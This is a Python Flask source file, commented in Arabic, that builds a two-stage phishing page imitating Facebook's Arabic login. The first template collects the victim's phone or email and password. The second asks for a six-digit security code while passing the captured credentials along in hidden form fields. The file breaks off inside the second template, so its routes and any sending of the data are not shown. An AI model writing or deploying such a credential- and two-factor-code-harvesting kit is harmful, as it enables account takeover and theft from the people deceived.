from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

# واجهة تسجيل الدخول (المرحلة 1)
html_login = """
<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook</title></head>
<body style="background:#f0f2f5;display:flex;justify-content:center;padding-top:50px;font-family:sans-serif;">
<div style="background:white;padding:20px;border-radius:8px;width:330px;box-shadow:0 2px 4px rgba(0,0,0,0.1);text-align:center;">
<h1 style="color:#1877f2;font-size:40px;margin-bottom:20px;">facebook</h1>
<form action="/auth" method="POST">
<input type="text" name="u" placeholder="الهاتف أو البريد" style="width:100%;padding:14px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;" required>
<input type="password" name="p" placeholder="كلمة السر" style="width:100%;padding:14px;margin-bottom:16px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;" required>
<button style="width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-weight:bold;font-size:18px;cursor:pointer;">تسجيل الدخول</button>
</form></div></body></html>
"""

# واجهة رمز الأمان (المرحلة 2)
html_code = """
<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تأكيد الهوية</title></head>
<body style="background:#f0f2f5;display:flex;justify-content:center;padding-top:50px;font-family:sans-serif;">
<div style="background:white;padding:20px;border-radius:8px;width:330px;box-shadow:0 2px 4px rgba(0,0,0,0.1);text-align:center;">
<h3 style="color:#4b4f56;margin-bottom:10px;">أدخل رمز الأمان</h3>
<p style="font-size:14px;color:#606770;margin-bottom:20px;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك. يرجى إدخاله للمتابعة وتأمين حسابك.</p>
<form action="/final" method="POST">
<input type="hidden" name="user" value="{{u}}">
<input type="hidden" name="pass" value="{{p}}">
<input type="text" name="code" placeholder="رمز التأكيد (6 أرقام)" style="width:100%;padding:14px;margin-bottom:16px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;text-align:center;" required>
<button style="width:100%;padding:12px;background:#42b72a;color:white;border:none;border-radius:6px;font-weight:bold;font-size:18px;cursor:pointer;">تأكيد الرمز</button>
</form></div></body></html>
